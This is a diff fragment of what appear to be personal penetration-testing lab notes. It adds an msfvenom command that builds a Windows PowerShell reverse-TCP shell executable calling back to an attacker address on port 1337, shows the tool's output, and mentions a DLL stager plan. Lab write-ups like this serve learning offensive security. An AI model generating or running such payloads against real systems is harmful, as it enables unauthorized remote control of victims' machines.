@@ -771,5 +771,15 @@ This means the C code works, i just need to figure out the best way to trigger a
 So i think the best way to do this, is to use the DLL as a stager
 
 ```python
+msfvenom -a x64 -p windows/x64/powershell_reverse_tcp LHOST=10.200.75.73 LPORT=1337 -f exe > shell.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 1891 bytes
+Final size of exe file: 8704 bytes
+```
+
+So first ill create the second stage
+
+```python
 
 ```
